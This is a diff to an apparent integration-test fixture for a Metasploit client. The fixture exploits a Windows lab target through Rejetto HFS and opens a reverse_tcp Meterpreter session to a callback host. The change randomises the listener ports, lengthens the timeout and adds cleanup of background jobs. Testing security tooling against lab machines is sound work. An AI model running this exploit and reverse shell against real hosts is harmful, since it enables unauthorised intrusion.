@@ -516,12 +516,14 @@ async def windows_meterpreter_session(client, integration_env):
 
     This is MUCH faster than the shell upgrade approach and more reliable.
     """
+    import random
     target_host = os.environ.get("TARGET_WINDOWS_HOST", "assassinate-target-windows")
     lhost = os.environ.get("LHOST")
     if not lhost:
         import socket
         lhost = socket.gethostbyname(socket.gethostname())
-    lport = int(os.environ.get("LPORT", "4433"))
+    # Use random port to avoid conflicts between tests
+    lport = random.randint(44000, 45000)
 
     print(f"\n🎯 Exploiting Windows target via Rejetto HFS")
     print(f"   Target: {target_host}:80")
@@ -535,16 +537,18 @@ async def windows_meterpreter_session(client, integration_env):
         await client.module_set_option(module_id, "RHOSTS", target_host)
         await client.module_set_option(module_id, "LHOST", lhost)
         await client.module_set_option(module_id, "LPORT", str(lport))
-        # Use different SRVPORT to avoid conflicts
-        await client.module_set_option(module_id, "SRVPORT", "8888")
+        # Use random SRVPORT to avoid conflicts between tests
+        srvport = random.randint(8800, 8900)
+        await client.module_set_option(module_id, "SRVPORT", str(srvport))
 
         print("   Running exploit...")
 
         # Run exploit with Meterpreter payload (32-bit since HFS is 32-bit)
+        # NOTE: Increase timeout to 120s - Windows VM can be slow with multiple exploits
         session_id = await client.module_exploit(
             module_id,
             "windows/meterpreter/reverse_tcp",
-            timeout=60.0
+            timeout=120.0
         )
 
         if session_id:
@@ -564,3 +568,15 @@ async def windows_meterpreter_session(client, integration_env):
                 print(f"   🧹 Cleaned up Windows Meterpreter session {session_id}")
             except Exception:
                 pass
+        # Clean up any background jobs (handlers, staging servers)
+        try:
+            jobs = await client.job_list()
+            for job_id in jobs:
+                try:
+                    await client.job_kill(job_id)
+                except Exception:
+                    pass
+            if jobs:
+                print(f"   🧹 Cleaned up {len(jobs)} background jobs")
+        except Exception:
+            pass
